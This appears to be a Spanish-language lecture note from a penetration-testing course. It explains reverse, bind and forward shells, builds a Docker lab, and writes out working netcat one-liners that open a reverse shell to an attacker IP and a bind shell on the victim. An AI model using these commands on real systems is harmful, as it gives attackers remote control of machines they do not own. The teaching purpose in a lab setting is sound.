En esta clase, veremos las diferencias entre Reverse Shell, Bind Shell y Forward Shell:

- **Reverse Shell**: Es una técnica que permite a un atacante conectarse a una máquina remota desde una máquina de su propiedad. Es decir, se establece una conexión desde la máquina comprometida hacia la máquina del atacante. Esto se logra ejecutando un programa malicioso o una instrucción específica en la máquina remota que establece la conexión de vuelta hacia la máquina del atacante, permitiéndole tomar el control de la máquina remota.

- **Bind Shell**: Esta técnica es el opuesto de la Reverse Shell, ya que en lugar de que la máquina comprometida se conecte a la máquina del atacante, es el atacante quien se conecta a la máquina comprometida. El atacante escucha en un puerto determinado y la máquina comprometida acepta la conexión entrante en ese puerto. El atacante luego tiene acceso por consola a la máquina comprometida, lo que le permite tomar el control de la misma.

- **Forward Shell**: Esta técnica se utiliza cuando no se pueden establecer conexiones Reverse o Bind debido a reglas de Firewall implementadas en la red. Se logra mediante el uso de **mkfifo**, que crea un archivo **FIFO** (**named pipe**), que se utiliza como una especie de “**consola simulada**” interactiva a través de la cual el atacante puede operar en la máquina remota. En lugar de establecer una conexión directa, el atacante redirige el tráfico a través del archivo **FIFO**, lo que permite la comunicación bidireccional con la máquina remota.

Es importante entender las diferencias entre estas técnicas para poder determinar cuál es la mejor opción en función del escenario de ataque y las limitaciones de la red.

## Crear Entorno en Docker
### Crear un Docker file
```dockerfile
FROM ubuntu:latest

ENV DEBIAN_FRONTEND noninteractive

RUN apt update && apt install -y apache2 \
  php

EXPOSE 80

ENTRYPOINT service apache2 start && /bin/bash
```
#### Ejecutar 
```bash
## Contruir Imagen
docker build -t my_image .

## Construir contenedor
docker run -dit -p 80:80 --cap-add=NET_admin --name myContainer my_image

## Ejecutar contenedor
docker exec -it myContainer bash 
```
## Reverse Shell
```bash
## Maquina Atacante
nc -nlvp 443

## Maquina Victima
ncat -e /bin/bash <IP-Atacante> <PORT>
# Ejemplo 👇
ncat -e /bin/bash 172.17.0.1 443

## Poner un prompt en la consola interactiva
script -c /dev/null -c bash
```
## Bind Shell (Victima ofrece una Shell)
```bash
## Maquina Victima
ncat -nlvp 443 -e /bin/bash

## Maquina Atacante
nc <IP-Victima> <PORT>
```